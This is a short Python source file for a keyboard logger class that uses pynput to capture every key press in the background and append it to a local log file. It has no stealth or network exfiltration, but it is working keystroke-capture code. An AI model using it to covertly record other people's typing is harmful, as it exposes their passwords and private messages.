from pynput.keyboard import Listener

class KeyboardLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.listener = None
    
    def _write_file(self, key_data):
        with open(self.log_file, 'a') as f:
            f.write(f"{key_data} ")
    
    def on_press(self, key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = str(key).replace("Key.", "")
            
        self._write_file(key_data)
    
    def start_non_blocking(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
    
    def stop(self):
        if self.listener:
            self.listener.stop()
